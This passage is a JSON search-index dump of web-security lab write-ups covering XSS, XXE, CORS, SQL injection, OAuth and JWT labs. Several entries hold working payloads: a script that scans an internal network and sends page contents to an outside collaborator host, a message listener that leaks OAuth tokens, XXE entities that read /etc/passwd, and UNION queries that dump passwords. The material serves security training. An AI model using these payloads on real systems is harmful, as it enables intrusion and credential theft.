inside the storeId parameter: https://0a07003f04c9eae2c0c9af0b0027005f.web-security-academy.net/product?productId=4&storeId=<script>alert(0)</script>",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "91f3253e091fdb7c3242b23b15772c34",
    "u": "https://webapp.tymyrddin.dev/docs/pollution/4",
    "t": "Client-side prototype pollution in third-party libraries ",
    "c": "Client-side prototype pollution in third-party libraries  Description  This lab is vulnerable to DOM XSS via client-side prototype pollution. This is due to a gadget in a third-party library, which is easy to miss due to the minified source code. Reproduction and proof of concept  Load the lab in Burp’s built-in browser. Enable DOM Invader and enable the prototype pollution option. Open the browser DevTools panel, go to the DOM Invader tab, then reload the page. Observe that DOM Invader has identified two prototype pollution vectors in the hash property i.e. the URL fragment string. Click Scan for gadgets . A new tab opens in which DOM Invader begins scanning for gadgets using the selected source. When the scan is complete, open the DevTools panel in the same tab as the scan, then go to the DOM Invader tab. Observe that DOM Invader has successfully accessed the setTimeout() sink via the hitCallback gadget. Click Exploit. DOM Invader automatically generates a proof-of-concept exploit and calls alert(1) . https://0a76003f03e6226bc0df1817002a00bc.web-security-academy.net/#constructor[prototype][hitCallback]=alert%281%29 Disable DOM Invader . In the browser, go to the lab’s exploit server. In the Body section, craft an exploit that will navigate the victim to a malicious URL: <script> location=\"https://0a76003f03e6226bc0df1817002a00bc.web-security-academy.net/#__proto__[hitCallback]=alert%28document.cookie%29\" </script> Test the exploit on yourself, making sure that you’re navigated to the lab’s home page and that the alert(document.cookie) payload is triggered. Go back to the exploit server and deliver the exploit to the victim to solve the lab. Exploitability  An attacker will need to use DOM Invader to identify a prototype pollution and a gadget for DOM XSS; and use the exploit server to deliver a payload to the victim that calls alert(document.cookie) in their browser. Although it’s technically possible to solve this lab manually, using DOM Invader is recommended as this will save a considerable amount of time and effort.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "c26d63534eaeae90b415bbb96674d49e",
    "u": "https://webapp.tymyrddin.dev/docs/xxe/3",
    "t": "Blind XXE with out-of-band interaction ",
    "c": "Blind XXE with out-of-band interaction  Description  This lab has a “Check stock” feature that parses XML input but does not display the result. You can detect the blind XXE vulnerability by triggering out-of-band interactions with an external domain. Reproduction and proof of concept  Visit a product page, click “Check stock” and intercept the resulting POST request in Burp Suite Professional. Go to the Burp menu, and launch the Burp Collaborator client. Click “Copy to clipboard” to copy a unique Burp Collaborator payload to your clipboard. Leave the Burp Collaborator client window open. Insert the following external entity definition in between the XML declaration and the stockCheck element, but insert your Burp Collaborator subdomain where indicated: <!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM \"http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net\"> ]> Replace the productId number with a reference to the external entity &xxe; Go back to the Burp Collaborator client window, and click “Poll now”. You should see some DNS and HTTP interactions that were initiated by the application as the result of the payload. If you don’t see any interactions listed, wait a few seconds and try again. Exploitability  An attacker needs to use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator. Note: To prevent the Academy platform being used to attack third parties, the firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator’s default public server.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "e67857ddd499c142a28d854f4876d9ca",
    "u": "https://webapp.tymyrddin.dev/docs/cors/4",
    "t": "CORS vulnerability with internal network pivot attack ",
    "c": "CORS vulnerability with internal network pivot attack  Description  The website of this lab has an insecure CORS configuration in that it trusts all internal network origins, and requires multiple steps to complete . Reproduction and proof of concept  Scan the local network for the endpoint. Replace $collaboratorPayload with your Collaborator payload or exploit server URL. Enter the code into the exploit server. Click Store , then Deliver exploit to victim . Inspect the log or the Collaborator interaction and look at the code parameter sent to it. <html> <script> collaboratorURL = 'http://z337wm2yp0htx6wbpc4jq10az15ttjh8.oastify.com' for (let i=0; i<256; i++){ fetch('http://192.168.0.' + i + ':8080') .then(response => response.text()) .then (text => { try { fetch(collaboratorURL + '?ip=' + 'http://192.168.0.' + i + \"&code=\" + encodeURIComponent(text)) } catch(err){ } }) } </script> </html> Results: GET /?ip=http://192.168.0.105&code=%3C!DOCTYPE%20html%3E%0A%3Chtml%3E%0A%20%20%20%20%3Chead%3E%0A%20%20%20%20%20%20%20%20%3Clink%20href%3D%2Fresources%2Flabheader%2Fcss%2FacademyLabHeader.css%20rel%3Dstylesheet%3E%0A%20%20%20%20%20%20%20%20%3Clink%20href%3D%2Fresources%2Fcss%2Flabs.css%20rel%3Dstylesheet%3E%0A%20%20%20%20%20%20%20%20%3Ctitle%3ECORS%20vulnerability%20with%20internal%20network%20pivot%20attack%3C%2Ftitle%3E%0A%20%20%20%20%3C%2Fhead%3E%0A%20%20%20%20%3Cbody%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cscript%20src%3D%22%2Fresources%2Flabheader%2Fjs%2FlabHeader.js%22%3E%3C%2Fscript%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%22academyLabHeader%22%3E%0A%20%20%20%20%3Csection%20class%3D%27academyLabBanner%27%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20class%3Dcontainer%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3Dlogo%3E%3C%2Fdiv%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3Dtitle-container%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch2%3ECORS%20vulnerability%20with%20internal%20network%20pivot%20attack%3C%2Fh2%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20id%3D%27exploit-link%27%20class%3D%27button%27%20target%3D%27_blank%27%20href%3D%27http%3A%2F%2Fexploit-0ad7009503fd8eb5c174842a019b0019.exploit-server.net%27%3EGo%20to%20exploit%20server%3C%2Fa%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20class%3Dlink-back%20href%3D%27https%3A%2F%2Fportswigger.net%2Fweb-security%2Fcors%2Flab-internal-network-pivot-attack%27%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20Back%26nbsp%3Bto%26nbsp%3Blab%26nbsp%3Bdescription%26nbsp%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Csvg%20version%3D1.1%20id%3DLayer_1%20xmlns%3D%27http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%27%20xmlns%3Axlink%3D%27http%3A%2F%2Fwww.w3.org%2F1999%2Fxlink%27%20x%3D0px%20y%3D0px%20viewBox%3D%270%200%2028%2030%27%20enable-background%3D%27new%200%200%2028%2030%27%20xml%3Aspace%3Dpreserve%20title%3Dback-arrow%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cpolygon%20points%3D%271.4%2C0%200%2C1.2%2012.6%2C15%200%2C28.8%201.4%2C30%2015.1%2C15%27%3E%3C%2Fpolygon%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cpolygon%20points%3D%2714.3%2C0%2012.9%2C1.2%2025.6%2C15%2012.9%2C28.8%2014.3%2C30%2028%2C15%27%3E%3C%2Fpolygon%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fg%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fsvg%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fa%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%27widgetcontainer-lab-status%20is-notsolved%27%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cspan%3ELAB%3C%2Fspan%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%3ENot%20solved%3C%2Fp%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cspan%20class%3Dlab-status-icon%3E%3C%2Fspan%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0A%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0A%20%20%20%20%3C%2Fsection%3E%0A%3C%2Fdiv%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20theme%3D%22%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Csection%20class%3D%22maincontainer%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22container%20is-page%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cheader%20class%3D%22navigation-header%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Csection%20class%3D%22top-links%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20href%3D%2F%3EHome%3C%2Fa%3E%3Cp%3E%7C%3C%2Fp%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20href%3D%22%2Fmy-account%22%3EMy%20account%3C%2Fa%3E%3Cp%3E%7C%3C%2Fp%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fsection%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fheader%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cheader%20class%3D%22notification-header%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fheader%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch1%3ELogin%3C%2Fh1%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Csection%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cform%20class%3Dlogin-form%20method%3DPOST%20action%3D%2Flogin%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20required%20type%3D%22hidden%22%20name%3D%22csrf%22%20value%3D%22ut7nEPmQYOw9dkmqlppKHtZxG4JgiF4k%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Clabel%3EUsername%3C%2Flabel%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20required%20type%3Dusername%20name%3D%22username%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Clabel%3EPassword%3C%2Flabel%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20required%20type%3Dpassword%20name%3D%22password%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cbutton%20class%3Dbutton%20type%3Dsubmit%3E%20Log%20in%20%3C%2Fbutton%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fform%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fsection%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fsection%3E%0A%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0A%20%20%20%20%3C%2Fbody%3E%0A%3C%2Fhtml%3E%0A HTTP/1.1 Host: z337wm2yp0htx6wbpc4jq10az15ttjh8.oastify.com Connection: keep-alive User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.119 Safari/537.36 Accept: */* Origin: http://exploit-0ad7009503fd8eb5c174842a019b0019.exploit-server.net Referer: http://exploit-0ad7009503fd8eb5c174842a019b0019.exploit-server.net/ Accept-Encoding: gzip, deflate Accept-Language: en-US url-decoded source code parameter: <!DOCTYPE html> < html > < head > < link href = /resources/labheader/css/academyLabHeader.css rel = stylesheet > < link href = /resources/css/labs.css rel = stylesheet > < title > CORS vulnerability with internal network pivot attack </ title > </ head > < body > < script src = \"/resources/labheader/js/labHeader.js\" ></ script > < div id = \"academyLabHeader\" > < section class = 'academyLabBanner' > < div...",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "02ea86194b52948e501b6cd9a66ee843",
    "u": "https://webapp.tymyrddin.dev/docs/xss/25",
    "t": "Reflected XSS with event handlers and href attributes blocked ",
    "c": "Reflected XSS with event handlers and href attributes blocked  Description  The website in this lab contains a reflected XSS vulnerability with some whitelisted tags, but all events and anchor href attributes are blocked. Reproduction and proof of concept  Visit the following URL, replacing 0aea002d04f460bbc1d2491e00ad00da with your lab ID: https://0aea002d04f460bbc1d2491e00ad00da.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "d7983f321f60370a564087eacab7f8ad",
    "u": "https://webapp.tymyrddin.dev/docs/sqli/3",
    "t": "SQL injection UNION attack, determining the number of columns returned by the query ",
    "c": "SQL injection UNION attack, determining the number of columns returned by the query  Description  This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application’s response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. Reproduction and proof of concept  Use Burp Suite to intercept and modify the request that sets the product category filter. Modify the category parameter, giving it the value '+UNION+SELECT+NULL-- . Note that an error occurs. Modify the category parameter to add another column containing a null value: '+UNION+SELECT+NULL,NULL-- Continue adding null values until the error disappears and the response includes additional content containing the null values. Exploitability  An attacker needs to determine the number of columns returned by the query by performing an SQL injection UNION attack that returns an additional row containing null values.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "ecc045d307d29f8e61cd412cfcb29a14",
    "u": "https://webapp.tymyrddin.dev/docs/deserialisation/4",
    "t": "Arbitrary object injection in PHP ",
    "c": "Arbitrary object injection in PHP  Description  This lab uses a serialisation-based session mechanism and is vulnerable to arbitrary object injection as a result. Reproduction  Log in to the site with the wiener:peter account. The session cookie contains a serialised PHP object. From the site map, notice that the website references the file /libs/CustomTemplate.php . Right-click on the file and select Send to Repeater . In Burp Repeater, read the source code by appending a tilde ( ~ ) to the filename in the request line. In the source code, the CustomTemplate class contains the __destruct() magic method. This will invoke the unlink() method on the lock_file_path attribute, which will delete the file on this path. In Burp Decoder, use the correct syntax for serialised PHP data to create a CustomTemplate object with the lock_file_path attribute set to /home/carlos/morale.txt . Make sure to use the correct data type labels and length indicators. The final object should look like this: O:14:\"CustomTemplate\":1:{s:14:\"lock_file_path\";s:23:\"/home/carlos/morale.txt\";} Base64 and URL-encode this object and save it to the clipboard. Send a request containing the session cookie to Burp Repeater. In Burp Repeater, replace the session cookie with the modified cookie in the clipboard. Send the request. The __destruct() magic method is automatically invoked and will delete Carlos’s file. PoC  Exploitability  An attacker will need to log in to wiener:peter ; create and inject a malicious serialized object to delete the morale.txt file from Carlos’s home directory. An attacker will need to obtain source code access to solve this lab.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "6eb3806dacf454d91465a44b108a19f8",
    "u": "https://webapp.tymyrddin.dev/docs/acl/5",
    "t": "User ID controlled by request parameter ",
    "c": "User ID controlled by request parameter  Description  This lab has a horizontal privilege escalation vulnerability on the user account page. Reproduction and proof of concept  Log in using wiener:peter and go to your account page. Note that the URL contains your username in the “id” parameter. Send the request to Burp Repeater. Change the “id” parameter to carlos . Retrieve the API key for carlos . Enter it as the solution. Exploitability  An attacker will need to obtain the API key for the user carlos.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "d8e3d8460b2058fd3fa2140b275959a7",
    "u": "https://webapp.tymyrddin.dev/docs/xxe/9",
    "t": "Exploiting XXE to retrieve data by repurposing a local DTD ",
    "c": "Exploiting XXE to retrieve data by repurposing a local DTD  Description  This lab has a Check stock feature that parses XML input but does not display the result. See Automating local DTD discovery for XXE exploitation for an excellent description of this attack and their github repo for a list of potential DTD files. Reproduction and proof of concept  Visit a product page, click Check stock , and intercept the resulting POST request in Burp Suite. Send to Repeater and insert the following parameter entity definition in between the XML declaration and the stockCheck element: <!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM \"file:///usr/share/yelp/dtd/docbookx.dtd\"> <!ENTITY % ISOamso ' <!ENTITY &#x25; file SYSTEM \"file:///etc/passwd\"> <!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>\"> &#x25;eval; &#x25;error; '> %local_dtd; ]> This will import the Yelp DTD, then redefine the ISOamso entity, triggering an error message containing the contents of the /etc/passwd file. Exploitability  An attacker will need to reference an existing DTD file on the server and redefine an entity from it to trigger an error message containing the contents of the /etc/passwd file.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "2074fb54501dc7dfdec128f5afb0a33d",
    "u": "https://webapp.tymyrddin.dev/docs/web-server/jwt3",
    "t": "JWT weak secret ",
    "c": "JWT weak secret  RootMe challege: JWT - Weak secret : This API with its /hello endpoint (accessible with GET) seems rather welcoming at first glance but is actually trying to play a trick on you. Recover its most valuable secrets! Argh: ┌──(kali㉿kali)-[~/Downloads] └─$ hashcat -a 0 -m 16500 jwt jwt.secrets.list hashcat (v6.2.6) starting # http://challenge01.root-me.org/web-serveur/ch59 import jwt secret = \"secret\" hacked_token = jwt.encode({\"role\": \"admin\"}, secret, algorithm=\"HS512\") print(f\"Hacked token:{hacked_token}\") etcetera. Resources  JWT techniques (these writeups)",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "eba14d9a9441a9ee6797e3870d6ed5ea",
    "u": "https://webapp.tymyrddin.dev/docs/oauth/6",
    "t": "Stealing OAuth access tokens via a proxy page ",
    "c": "Stealing OAuth access tokens via a proxy page  Description  This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the OAuth service makes it possible for an attacker to leak access tokens to arbitrary pages on the client application. Reproduction and proof of concept  Log in with wiener:peter . Study the OAuth flow while proxying traffic through Burp. Using the same method as in the previous lab, identify that the redirect_uri is vulnerable to directory traversal. This enables you to redirect access tokens to arbitrary pages on the blog website. Using Burp, audit the other pages on the blog website. Observe that the comment form is included as an iframe on each blog post. Look closer at the /post/comment/comment-form page in Burp: <script> parent.postMessage({type: 'onload', data: window.location.href}, '*') function submitForm(form, ev) { ev.preventDefault(); const formData = new FormData(document.getElementById(\"comment-form\")); const hashParams = new URLSearchParams(window.location.hash.substr(1)); const o = {}; formData.forEach((v, k) => o[k] = v); hashParams.forEach((v, k) => o[k] = v); parent.postMessage({type: 'oncomment', content: o}, '*'); form.reset(); } </script> It uses the postMessage() method to send the window.location.href property to its parent window. Crucially, it allows messages to be posted to any origin ( * ). From the proxy history, right-click on the GET /auth?client_id=[...] request and select Copy URL . https://oauth-0a96005b04ff5f0ac04f571402a3005d.oauth-server.net/auth?client_id=i1venwl6rtpdzcwkm9or8&redirect_uri=https://0a1b0095040d5f81c0cc594500a900a1.web-security-academy.net/oauth-callback&response_type=token&nonce=1976758516&scope=openid%20profile%20email Go to the exploit server and create an iframe in which the src attribute is the URL you just copied. Use directory traversal to change the redirect_uri so that it points to the comment form. The result should look something like this: <iframe src=\"https://oauth-0a96005b04ff5f0ac04f571402a3005d.oauth-server.net/auth?client_id=i1venwl6rtpdzcwkm9or8&redirect_uri=https://0a1b0095040d5f81c0cc594500a900a1.web-security-academy.net/oauth-callback/post/comment/comment-form&response_type=token&nonce=1976758516&scope=openid%20profile%20email\"></iframe> Below this, add a suitable script that will listen for web messages and output the contents somewhere. For example, you can use the following script to reveal the web message in the exploit server’s access log: <script> window.addEventListener('message', function(e) { fetch(\"/\" + encodeURIComponent(e.data.data)) }, false) </script> To check the exploit is working, store it and then click View exploit . Make sure that the iframe loads then go to the exploit server’s access log. There should be a request for which the path is the full URL of the comment form, along with a fragment containing the access token. Go back to the exploit server and deliver this exploit to the victim. Copy their access token from the log. Make sure you don’t accidentally include any of the surrounding URL-encoded characters. Send the GET /me request to Burp Repeater. In Repeater, replace the token in the Authorization: Bearer header with the one you just copied and send the request. Observe that you have successfully made an API call to fetch the victim’s data, including their API key. Use the Submit solution button at the top of the lab page to submit the stolen key and solve the lab. Exploitability  An attacker will need to log in; and then identify a secondary vulnerability in the client application and use this as a proxy to steal an access token for the admin user’s account; use the access token to obtain the admin’s API key and submit the solution using the button provided in the lab banner. The admin user will open anything you send from the exploit server, and they always have an active session with the OAuth service.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "c03938cb3fa3bc7c32b7d8bb6c39f190",
    "u": "https://webapp.tymyrddin.dev/docs/techniques/xxe",
    "t": "XML external entity (XXE) injection ",
    "c": "XML external entity (XXE) injection  We can modify XML documents and define the document using a DTD. If an entity is declared within a DTD it is called as internal entity. <!ENTITY entity_name \"entity_value\"> If an entity is declared outside a DTD it is called as external entity. Identified by SYSTEM. <!ENTITY entity_name SYSTEM \"entity_value\"> Parsers can resolve external references that could be displayed to the user. You can use these XXE Templates . Steps  Find data entry points that you can use to submit XML data. Determine whether the entry point is a candidate for a classic or blind XXE. The endpoint might be vulnerable to classic XXE if it returns the parsed XML data in the HTTP response. If the endpoint does not return results, it might still be vulnerable to blind XXE, and you should set up a callback listener for your tests. Try out a few test payloads to see if the parser is improperly configured. In the case of classic XXEs, you can check whether the parser is processing external entities. In the case of blind XXEs, you can make the server send requests to your callback listener to see if you can trigger outbound interaction. If the XML parser has the functionalities that make it vulnerable to XXE attacks, try to exfiltrate a common system file, like /etc/hostname. You can also try to retrieve some more sensitive system files, like /etc/shadow or ~/.bash_history . If you cannot exfiltrate the entire file with a simple XXE payload, try to use an alternative data exfiltration method. See if you can launch an SSRF attack using the XXE. Draft up report. Escalation  What can be achieved with an XXE vulnerability depends on the permissions given to the XML parser. Generally, XXEs can be used to access and exfiltrate system files, source code, and directory listings on the local machine. You can also use XXEs to perform SSRF attacks to port-scan the target’s network, read files on the network, and access resources that are hidden behind a firewall. And, attackers sometimes use XXEs to launch DoS attacks. Disclosing local files containing sensitive data, like passwords, using file: schemes or relative paths in the system identifier. XXE attacks rely on the application that processes the XML document. A trusted application can be used to move to different internal systems. If the XML processor library is vulnerable to client-side memory corruption, it may be possible to dereference a malicious URI to allow arbitrary code execution under the application account. Some XML attacks might allow actors to access local resources that do not stop returning data. If too many processes or threads are not released, it can negatively impact application availability. Portswigger lab writeups  Exploiting XXE using external entities to retrieve files Exploiting XXE to perform SSRF attacks Blind XXE with out-of-band interaction Blind XXE with out-of-band interaction via XML parameter entities Exploiting blind XXE to exfiltrate data using a malicious external DTD Exploiting blind XXE to retrieve data via error messages Exploiting XInclude to retrieve files Exploiting XXE via image file upload Exploiting XXE to retrieve data by repurposing a local DTD Remediation  Manual XXE Prevention: Prevent vulnerabilities in entities outside XML by configuring the XML parser to disallow custom DTDs. Applications rarely require DTD, because there are very few functional trade-offs. Every parser in each programming language comes with its own requirements for setting this parameter. A project containing several analyses might require manually configuring each solver correctly. If you cannot disable DTDs, mitigate this risk by disabling the external entity functionality. Implement some application server instrumentation using runtime application self protection (RASP) to add personalised protection for applications and interactive application security testing (IAST) to find vulnerabilities during execution. Resources  Portswigger: XML external entity (XXE) injection OWASP: XML External Entity (XXE) Processing OWASP: XML External Entity Prevention Cheat Sheet Bug Bounty Bootcamp Bug Bounty Hunting Essentials Bug Bounty Hunting for Web Security",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "b8e2dbc6bad4a6877a538f540ad061c3",
    "u": "https://webapp.tymyrddin.dev/docs/sqli/6",
    "t": "SQL injection UNION attack, retrieving multiple values in a single column ",
    "c": "SQL injection UNION attack, retrieving multiple values in a single column  Description  This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application’s response, it is possible to use a UNION attack to retrieve data from other tables. The database contains a different table called users, with columns called username and password. Reproduction and proof of concept  Use Burp Suite to intercept and modify the request that sets the product category filter. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, only one of which contain text, using a payload like the following in the category parameter: '+UNION+SELECT+NULL,'abc'-- Use the following payload to retrieve the contents of the users table: '+UNION+SELECT+NULL,username||'~'||password+FROM+users-- Verify that the application’s response contains usernames and passwords. Log in as administrator. Exploitability  An attacker needs to perform an SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "aaf29e24687cfb56e9899afaa8470f48",
    "u": "https://webapp.tymyrddin.dev/docs/acl/7",
    "t": "User ID controlled by request parameter with data leakage in redirect ",
    "c": "User ID controlled by request parameter with data leakage in redirect  Description  This lab contains an access control vulnerability where sensitive information is leaked in the body of a redirect response. Reproduction and proof of concept  Log in with wiener:peter and access the account page. Send the request to Burp Repeater. Change the “id” parameter to carlos . Observe that although the response is now redirecting you to the home page, it has a body containing the API key belonging to carlos . Submit the API key. Exploitability  An attacker will need to log in, obtain the API key for the user carlos and submit it as the solution.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "0151eac38f78b4b01a109a7b6561e07f",
    "u": "https://webapp.tymyrddin.dev/docs/oauth/2",
    "t": "Forced OAuth profile linking ",
    "c": "Forced OAuth profile linking  Description  This lab gives you the option to attach a social media profile to your account so that you can log in via OAuth instead of using the normal username and password. Due to the insecure implementation of the OAuth flow by the client application, an attacker can manipulate this functionality to obtain access to other users’ accounts. Reproduction and proof of concept  While proxying traffic through Burp, click My account . You are taken to a normal login page, but notice that there is an option to log in using your social media profile instead. For now, just log in to the blog website directly using the classic login form ( wiener:peter ). Notice that you have the option to attach your social media profile to your existing account. Click Attach a social profile . You are redirected to the social media website, where you should log in using your social media credentials (Social media profile: peter.wiener:hotdog ) to complete the OAuth flow. Afterwards, you will be redirected back to the blog website. Log out and then click My account to go back to the login page. This time, choose the Log in with social media option. You are logged in instantly via your newly linked social media account. In the proxy history, study the series of requests for attaching a social profile. In the GET /auth?client_id[...] request, observe that the redirect_uri for this functionality sends the authorisation code to /oauth-linking . Importantly, notice that the request does not include a state parameter to protect against CSRF attacks. Turn on proxy interception and select the Attach a social profile option again. Go to Burp Proxy and forward any requests until you have intercepted the one for GET /oauth-linking?code=[...] . Right-click on this request and select Copy URL . https://0acc00800434bb1ec2185295009d00d1.web-security-academy.net/oauth-linking?code=QIKelR_bOjRU_S54zZKLI7Lmf3wWMVMzp9JWicrlkps Drop the request. This is important to ensure that the code is not used and, therefore, remains valid. Turn off proxy interception and log out of the blog website. Go to the exploit server and create an iframe in which the src attribute points to the URL you just copied. The result should look something like this: <iframe src=\"https://0acc00800434bb1ec2185295009d00d1.web-security-academy.net/oauth-linking?code=QIKelR_bOjRU_S54zZKLI7Lmf3wWMVMzp9JWicrlkps\"></iframe> Deliver the exploit to the victim. When their browser loads the iframe , it will complete the OAuth flow using the social media profile, attaching it to the admin account on the blog website. Go back to the blog website and select the Log in with social media option again. Observe that you are instantly logged in as the admin user. Go to the admin panel and delete Carlos. Exploitability  An attacker will need to log in; and then use a CSRF attack to attach their own social media profile to the admin user’s account on the blog website, then access the admin panel and delete Carlos. The admin user will open anything sent from the exploit server, and always has an active session on the blog website.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "4da5c2052e7fc7b0d3d8b4b3d82b52d9",
    "u": "https://webapp.tymyrddin.dev/docs/web-server/jwt2",
    "t": "JWT (not) revoked token ",
    "c": "JWT (not) revoked token  RootMe challege: JWT - Revoked token : Two endpoints are available : POST : /web-serveur/ch63/login GET : /web-serveur/ch63/admin Gain access to the admin endpoint. Developer blacklists full JWT or hash of the JWT, instead of revoking the JTI (JWT id). Change request method to POST : Get token for admin:admin : Use the token to get the flag (add an = at the end of it). Resources  JWT techniques (these writeups)",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "c7d342218931c43859f7886d2e6cb171",
    "u": "https://webapp.tymyrddin.dev/docs/jwt/2",
    "t": "JWT authentication bypass via flawed signature verification ",
